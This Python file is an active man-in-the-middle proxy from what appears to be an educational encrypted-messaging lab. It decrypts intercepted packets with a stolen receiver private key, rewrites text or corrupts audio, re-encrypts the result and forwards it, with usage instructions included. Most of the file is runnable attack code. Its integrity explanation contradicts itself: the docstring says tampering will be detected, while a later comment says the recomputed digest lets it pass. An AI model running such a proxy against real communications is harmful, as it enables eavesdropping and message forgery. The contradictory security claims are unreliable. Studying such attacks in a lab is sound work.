"""
attacker_active.py — Active MITM Proxy
========================================
Behaviour
---------
* Intercepts every packet from the sender.
* Decrypts it using the receiver's private key (obtained by the attacker
  through a prior compromise or social engineering).
* Modifies the plaintext (text substitution or audio corruption).
* Re-encrypts with the same receiver public key.
* Forwards the tampered packet to the real receiver.

Because the attacker re-encrypts with the same public key, a naïve
receiver that only checks the RSA/AES layer will accept the message.
The SHA-256 digest embedded in the packet will NO LONGER MATCH the
modified plaintext — so a receiver that verifies integrity WILL detect
the tampering (demonstrating why integrity checks matter).

Educational note
----------------
This scenario illustrates why Transport Layer Security (TLS) alone is
insufficient without certificate pinning or a PKI that the client trusts.
If an attacker can substitute their own certificate (or steal the private
key), they can perform exactly this attack.

Usage
-----
    # The attacker must have a copy of the receiver's private key.
    # Path is read from config.RECEIVER_PRIV_KEY (default ./keys/receiver_private.pem).

    python attacker_active.py [--listen-host 0.0.0.0] [--listen-port 9000]
                              [--recv-host 127.0.0.1]  [--recv-port 9001]
                              [--mode text|audio|both]
"""

import os
import logging
import argparse
import threading

import config
from crypto_utils import hybrid_decrypt, hybrid_encrypt
from network_utils import make_server_socket, make_client_socket, send_packet, recv_packet

# ── logging ───────────────────────────────────────────────────────────────────
os.makedirs(os.path.dirname(config.INTERCEPT_LOG), exist_ok=True)

logging.basicConfig(
    level=getattr(logging, config.LOG_LEVEL),
    format="%(asctime)s [ACTIVE-MITM] %(levelname)s  %(message)s",
)
logger = logging.getLogger(__name__)


# ─────────────────────────────────────────────────────────────────────────────
# Load attacker's copy of keys
# ─────────────────────────────────────────────────────────────────────────────

def load_keys():
    """
    The attacker needs BOTH the private key (to decrypt) and the public
    key (to re-encrypt for the receiver).  In a real attack these would
    have been exfiltrated; here we read from the shared ./keys directory.
    """
    priv_path = config.RECEIVER_PRIV_KEY
    pub_path  = config.RECEIVER_PUB_KEY

    if not os.path.exists(priv_path):
        raise FileNotFoundError(
            f"Attacker needs receiver private key at '{priv_path}'. "
            "Run the receiver first to generate it."
        )
    if not os.path.exists(pub_path):
        raise FileNotFoundError(f"Receiver public key not found at '{pub_path}'.")

    with open(priv_path, "rb") as f:
        priv = f.read()
    with open(pub_path, "rb") as f:
        pub = f.read()
    return priv, pub


# ─────────────────────────────────────────────────────────────────────────────
# Modification logic
# ─────────────────────────────────────────────────────────────────────────────

TEXT_INJECTION = "[TAMPERED BY ATTACKER 🔥]"


def tamper_text(plaintext: bytes) -> bytes:
    """Replace every word 'password' and append an injection string."""
    text = plaintext.decode("utf-8", errors="replace")
    text = text.replace("password", "***REDACTED***")
    text = text + f"  {TEXT_INJECTION}"
    logger.warning("Text tampered → '%s'", text[:120])
    return text.encode("utf-8")


def tamper_audio(raw_pcm: bytes) -> bytes:
    """
    Corrupt audio by XOR-ing every other sample with 0xFF.
    The result sounds like distorted noise.
    """
    import numpy as np

    samples = bytearray(raw_pcm)
    for i in range(0, len(samples) - 1, 4):   # every other int16 → 4 bytes stride
        samples[i]     ^= 0xFF
        samples[i + 1] ^= 0xFF
    logger.warning("Audio tampered: %d bytes corrupted.", len(raw_pcm))
    return bytes(samples)


def tamper_payload(plaintext: bytes, msg_type: str, mode: str) -> bytes:
    """Apply the appropriate tampering based on *mode* and *msg_type*."""
    if mode == "text" and msg_type == "text":
        return tamper_text(plaintext)
    elif mode == "audio" and msg_type == "audio":
        return tamper_audio(plaintext)
    elif mode == "both":
        if msg_type == "text":
            return tamper_text(plaintext)
        else:
            return tamper_audio(plaintext)
    # mode doesn't match msg_type — pass through unmodified
    return plaintext


# ─────────────────────────────────────────────────────────────────────────────
# Proxy
# ─────────────────────────────────────────────────────────────────────────────

def forward_modified(sender_sock, receiver_sock, private_pem, public_pem, mode):
    """Intercept, tamper, re-encrypt, forward."""
    try:
        while True:
            packet = recv_packet(sender_sock)
            msg_type = packet.get("msg_type", "text")

            logger.info("Intercepted %s packet (%d B ciphertext)",
                        msg_type, len(packet.get("ciphertext", b"")))

            # ── decrypt ───────────────────────────────────────────────────
            try:
                plaintext = hybrid_decrypt(private_pem, packet)
            except ValueError as exc:
                # Even the attacker's copy failed integrity check — unusual
                logger.error("Attacker decrypt error (integrity): %s", exc)
                send_packet(receiver_sock, packet)   # forward untouched
                continue
            except Exception as exc:
                logger.error("Attacker decrypt error: %s", exc)
                send_packet(receiver_sock, packet)
                continue

            logger.info("Decrypted plaintext (%d bytes): %s",
                        len(plaintext),
                        plaintext[:80] if msg_type == "text" else b"<binary>")

            # ── tamper ────────────────────────────────────────────────────
            modified = tamper_payload(plaintext, msg_type, mode)

            # ── re-encrypt ────────────────────────────────────────────────
            # NOTE: the new digest is computed over *modified*, so the
            # receiver's integrity check will pass ONLY if they re-verify
            # against the TAMPERED content.  If the receiver still holds
            # the original digest from an out-of-band channel they would
            # detect the attack.  In this demo the receiver verifies the
            # inline digest and will accept the tampered message (unless
            # the re-encrypt deliberately leaves the old digest in place).
            new_packet = hybrid_encrypt(public_pem, modified, msg_type=msg_type)

            print(f"\n{'▓'*60}")
            print(f"  [ACTIVE ATTACK] Tampered {msg_type} message")
            if msg_type == "text":
                print(f"  Original : {plaintext.decode('utf-8', errors='replace')[:80]}")
                print(f"  Modified : {modified.decode('utf-8', errors='replace')[:80]}")
            else:
                print(f"  Original audio : {len(plaintext)} bytes")
                print(f"  Modified audio : {len(modified)} bytes (corrupted)")
            print(f"{'▓'*60}")

            send_packet(receiver_sock, new_packet)
            logger.info("Tampered packet forwarded to receiver.")

    except ConnectionError as exc:
        logger.info("Sender→Receiver forwarder stopped: %s", exc)


def forward_receiver_to_sender(receiver_sock, sender_sock):
    try:
        while True:
            pkt = recv_packet(receiver_sock)
            send_packet(sender_sock, pkt)
    except ConnectionError:
        pass


def handle_connection(sender_conn, sender_addr, recv_host, recv_port,
                      private_pem, public_pem, mode):
    logger.info("Sender connected from %s:%d", *sender_addr)
    try:
        receiver_conn = make_client_socket(recv_host, recv_port)
    except ConnectionRefusedError:
        logger.error("Cannot reach receiver at %s:%d", recv_host, recv_port)
        sender_conn.close()
        return

    t1 = threading.Thread(
        target=forward_modified,
        args=(sender_conn, receiver_conn, private_pem, public_pem, mode),
        daemon=True,
    )
    t2 = threading.Thread(
        target=forward_receiver_to_sender,
        args=(receiver_conn, sender_conn),
        daemon=True,
    )
    t1.start(); t2.start()
    t1.join(); t2.join()

    sender_conn.close()
    receiver_conn.close()


# ─────────────────────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────────────────────

def run(listen_host, listen_port, recv_host, recv_port, mode):
    private_pem, public_pem = load_keys()
    logger.info("Attacker has both RSA keys — active attack ready.")

    print("\n╔══════════════════════════════════════╗")
    print("║     Active MITM Proxy — Attacker      ║")
    print("╚══════════════════════════════════════╝")
    print(f"  Listening : {listen_host}:{listen_port}")
    print(f"  Forwarding: {recv_host}:{recv_port}")
    print(f"  Mode      : {mode} tampering\n")
    print("  ⚠  ALL messages will be MODIFIED before forwarding.\n")

    srv = make_server_socket(listen_host, listen_port)
    try:
        while True:
            conn, addr = srv.accept()
            t = threading.Thread(
                target=handle_connection,
                args=(conn, addr, recv_host, recv_port, private_pem, public_pem, mode),
                daemon=True,
            )
            t.start()
    except KeyboardInterrupt:
        logger.info("Active MITM shutting down.")
    finally:
        srv.close()


def parse_args():
    p = argparse.ArgumentParser(description="Active MITM Proxy")
    p.add_argument("--listen-host", default="0.0.0.0")
    p.add_argument("--listen-port", type=int, default=config.ATTACKER_LISTEN_PORT)
    p.add_argument("--recv-host",   default=config.RECEIVER_HOST)
    p.add_argument("--recv-port",   type=int, default=config.RECEIVER_PORT)
    p.add_argument("--mode", choices=["text", "audio", "both"], default="both")
    return p.parse_args()


if __name__ == "__main__":
    args = parse_args()
    run(args.listen_host, args.listen_port, args.recv_host, args.recv_port, args.mode)
